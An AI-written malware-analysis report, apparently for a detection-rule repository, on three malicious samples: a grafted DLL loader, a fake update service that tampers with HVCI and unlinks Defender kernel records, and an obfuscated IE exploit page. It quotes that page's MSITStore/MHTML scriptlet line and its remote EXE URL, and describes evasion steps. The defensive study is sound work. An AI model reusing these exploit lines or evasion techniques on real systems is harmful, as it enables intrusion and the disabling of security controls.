All three inputs are **MALICIOUS**. Findings below describe static code and
controlled CPU emulation with synthetic API stubs, not successful execution on
Windows. No specimen was run as a native program, and no malware endpoint was
contacted. External family names and sandbox scores were used as leads only.

The initial and final atomscan runs used local analysis, slow mode, and no rule
updates. Full cleave facts were saved for each original. Counts are distinct
trait IDs across each original and all extracted/decoded units; they do not
count the same kernel-code finding twice when it appears in a resource and its
parent. Class 0 is the ML classifier's benign result, separate from rule severity.

| SHA-256 prefix | Identification | Verdict | Hostile before/after | Suspicious before/after | ML probability before/after | ML class |
|---|---|---|---|---|---|---|
| 09def9c6a536 | word2html host with parasitic native DLL loader | MALICIOUS | 0 / 1 | 1 / 1 | 0.815410 / 0.959156 | 0 / 0 |
| 9e55188d8f68 | Microsoft Update-disguised ServiceDll installer and kernel-tampering DLL | MALICIOUS | 1 / 5 | 2 / 2 | 0.878101 / 0.979458 | 0 / 0 |
| 8c8fb533c231 | Phel-style NUL-obfuscated Internet Explorer HTML exploit | MALICIOUS | 0 / 2 | 0 / 4 | 0.000010 / 0.965148 | 0 / 0 |

The older v18 model bundle reports that its feature specification predates the
engine's v21 feature schema. All three remain classifier misses despite hostile
rule findings. No inaccurate finding was restored to manipulate these scores.
`comparison.json` records exact IDs added/removed, probabilities and per-unit
counts. Initial scan commands accidentally supplied `none` as an extra path;
the requested originals were nevertheless fully analyzed, and their saved
reports are intact. Final commands used the correct `--follow=none` spelling.

**09def9c6a536.** The unsigned x86 host retains a word2html PDB path and ordinary
COM/CRT imports, but its entry at VA 0x407f84 enters junk instructions and calls
0x401056. That location is a patched host trampoline: it calls 0x78a000 in the
appended writable/executable section, then branches over the displaced host
code. The tail is named UPX1, but its loader is an unrolled keyed arithmetic
decoder rather than evidence of ordinary UPX protection.

CPU emulation recovered the ECX-based add/subtract/XOR/not decoder's transformed
range, its PEB traversal and export hashing, and its calls to VirtualAlloc and
RtlDecompressBuffer. The LZNT1 compressed input is 0x46110 bytes; independent
LZNT1 decoding recovered a 404,992-byte native image. The image starts with PNG
magic, stores its NT-header offset at byte 8, and has its normal MZ/PE header
markers removed. A separately saved reconstruction repairs only the headers for
analysis; it is not claimed to be an original executable. Its imports are
separately XOR-obscured with a per-index byte table. The loader decrypts names
into a stack buffer, resolves imports, maps sections and relocations, changes
page permissions, flushes the instruction cache, and transfers control into the
mapped DLL. The mapped DllMain is a stub; an exported `_a@4` dispatches to further
obfuscated code. A reachable static CFG includes file reading, timestamp
save/restore and service operations. The broader resolved import vocabulary
also includes WinHTTP, network-resource enumeration and logon-session APIs;
those imports do not by themselves establish C2, propagation or credential theft.

This concealment and diversion of an existing application's entry path are
inconsistent with document conversion. There is no supplied authorized protector
or instrumentation deployment. The parasitic graft, disguised image and staged
execution tip the judgment to malicious; exact malware-family attribution and
the final networking/propagation logic remain unproven.

The existing arithmetic-decoder finding is preserved. A new structural rule
follows the actual entry call through a host trampoline into the appended
executable section; its combination with the existing decoder establishes the
hostile graft. Renaming the sample preserves detection. Breaking the trampoline
or removing executable permission removes the appropriate finding.

The 3–5 hostile-trait goal remains unmet for this input. The additional recovered
behaviors are arithmetic decoding, LZNT1 expansion, a PNG-disguised image,
XOR-obscured imports and native image mapping; these are stages of one loader,
not independently established hostile objectives. Cleave does not expand this
polymorphic arithmetic stage into an original-file analysis layer. Extraction,
header repair, import decoding and static CFG analysis were attempted; no broad,
faithful original-byte matcher for distinct C2, theft, replication or persistence
was established. Adding duplicate loader convictions or inferring those goals
from imports would overstate the evidence.

**9e55188d8f68.** The x64 GUI entry reaches main at VA 0x140004f80, starts analysis
checks, resolves APIs through case-folded DJB2 export walks and installs its
payload. The analysis checks refer to debugger/process-inspection windows and
kernel tools. Resource 103 contains a 3,288,080-byte native DLL; resource 102 is
a certificate. Resource extraction and writes stage the DLL as
`C:\Windows\ntshrui.dll`. The installer registers a shared-process automatic-start
service, writes an XOR-masked UTF16 ServiceDll value, configures svchost grouping,
and starts the service. Its display name and description claim to provide
Microsoft software updates. It also imports a certificate into TrustedPublisher;
that store is not the trusted-root store, and no root-CA escalation is asserted.

The installer writes zero DWORDs to Device Guard/VBS/HVCI policy settings. The
new byte matcher binds the same initialized zero buffer to the indirect call's
argument and follows its preceding resolver call to the registry-setter DJB2
comparison, rather than equating policy-name strings with writes. Additional
paths randomize file timestamps through NtSetInformationFile and delete
SVCHOST/RUNDLL32/DLLHOST Prefetch records. Service registration, security-policy
changes and cleanup are visible in reachable native code, not sandbox-only
claims. The new hostile coverage describes integrity-control tampering, service
persistence, execution-trace deletion, timestamp randomization and kernel-filter
blinding.

The embedded DLL locates WdFilter.sys, locates its internal records through
signature-guided addressing, searches its list/array, rewrites both sides of a
linked-list entry and adjusts a count. The memory-copy helper submits IOCTL
0x80862007 with operation 0x33 to a driver, permitting kernel reads and writes.
The unlink sequence is at VA 0x1801482aa onward and the driver-copy helper at
0x180148654. The rule requires the Defender target, kernel-copy request layout
and actual unlink sequence, with driver loading required for the hostile
composite. A changed IOCTL contract removes this behavior while preserving the
installer detections.

An important correction: IOCTL 0x222024 is also used with the program's own PID
at VA 0x18011a7ea, followed by token/privilege work. The DLL's TerminateProcess
references are ordinary CRT self-termination paths. That does not establish the
old claimed Defender process-kill flow. The raw immediate is retained as a
neutral instruction fact; native CcProtect termination inference now requires
the device contract and DeviceIoControl evidence, and Defender killing requires
an actual Defender process reference. The unrelated kernel-blinding behavior is
covered by the new accurate rule. The retained CcProtect source positive still
fires; unrelated device and numeric-only controls do not. The historical source
positive named in an existing review was unavailable locally; forager attempts
by its full hash failed at MalwareBazaar, Triage and Malshare. The accessible
existing controls and a faithful, explicitly labeled representative positive
were tested instead, without pretending the reconstruction was the original.

Three other misleading observations were corrected. The standalone Parameters
suffix moved from driver persistence to a neutral path-suffix reference. An
unused hollow-target aggregate only ORed generic executable-path observations;
it was removed while retaining those individual observations. Its only ancestor
consumer is PowerShell-only, disjoint from the removed PE/DLL aggregate. The
Cobalt Strike `/pixel` observation was matching Brotli dictionary text
`Harvard/pixel.removalso...`; it moved to a neutral endpoint-path rule requiring
a path or URL start. All three Cobalt profile consumers now reference that rule;
no Cobalt profile/config selector silently gained or lost members. An existing
Cobalt shellcode positive retains exactly the same findings, including four
hostile findings.

The net loss of one hostile and one suspicious original finding is intentional:
the process-kill claim and unqualified driver-termination inference were
unsupported. Five distinct supported hostile behaviors replace that gap. Accurate
DirectX/PNG encoding, enumeration APIs, kernel loading, certificate handling and
other dual-use observations remain. The unchanged Toolhelp umbrella no longer
appears after the engine's redundant-composite pruning, but its more specific
Toolhelp import enumeration finding and all enumeration primitives remain.

A game-cheat/spoofer or authorized lab context could explain some graphics and
driver capabilities. No such authorization or legitimate deployment is supplied.
The combined fake update service, security-control changes, Defender-record
unlinking and trace cleanup make this likely malicious on a discovered host.
No specific RAT/stealer family or successful outbound theft is asserted.

**8c8fb533c231.** Despite its VBS filename, the bytes identify HTML. Irregular
NUL insertion interrupts ASCII markup, language declarations and encoded script;
this is not ordinary UTF16. Removing NULs exposes an initial Script-language
SCRIPT tag sourcing a remote EXE and a Microsoft Script Encoder block. Script
Encoder decoding yields eval(unescape(...)); percent decoding yields the final
JavaScript. The original, normalized page and both decoded stages were retained
in scratch and inspected as source.

The code checks navigator.appVersion/appMinorVersion for MSIE/Windows/SP2
combinations. One path opens a modeless dialog on local `test1.htm` with top and
left both 2000px, suppresses status/scroll/help UI and refocuses the parent. The
other writes a hidden zero-size `text/x-scriptlet` OBJECT using
`mk:@MSITStore:mhtml:c:\.mht!http://959248.k86.opensrs.cn/cnwowmm/test.chm::/%23.htm`.
The initial tag sources test.exe from the same remote directory. This is a
legacy browser/help-handler exploit chain, not ordinary site functionality;
there is no supplied authorized exploit-test context. No specific CVE, CHM
contents, downloaded payload family or runtime success is inferred.

Original-byte rules now recognize NUL-split tags, Script Encoder-wrapped
percent-decoded evaluation, the remote-EXE Script element and the nested
MSITStore/MHTML scriptlet chain. Encoder substitutions permit all three columns,
so changed block alignment, lower-case percent hex and irregular NUL spacing
remain detectable. Plain protocol quotations, ordinary encoded output, missing
scriptlet/protocol legs, and JavaScript source URLs do not fire the new hostile
rules. Existing unrelated evaluator findings on harmless encoded document.write
fixtures are outside this input's findings and were not used as evidence.

The 3–5 hostile-trait goal remains unmet here because the supplied bytes establish
two exploit paths. The off-screen local-dialog path is explained but its
referenced HTML is absent; the remote EXE and CHM payloads are not embedded.
Neither an unseen payload nor a separate C2/theft/persistence behavior can be
inferred. Decoded-stage tracing and generalized encoded-token matching recovered
the two supported hostile paths; duplicating them would not add coverage. The
old baseline HTML-root observation is only omitted by engine presentation after
higher-severity findings appear; its matcher and the HTML identification remain.

Validation controls comprise 13 browser/path fixtures, a retained CcProtect
positive and two existing negatives, six native mutations, and the existing
Cobalt shellcode positive. The focused fixture checks and all native mutation
assertions passed. `make validate` is the final completion gate, including the
repository's broader positive/benign fixture checks; its outcome is reported in
the final assistant response. Raw before/after reports and emulation artifacts
are under the named scratch `bad-analysis` directory. Exactly one MALICIOUS
marker was written beside each supplied original. Their <=72-character lines
are reproduced verbatim in `commit-body.txt` for the commit body.
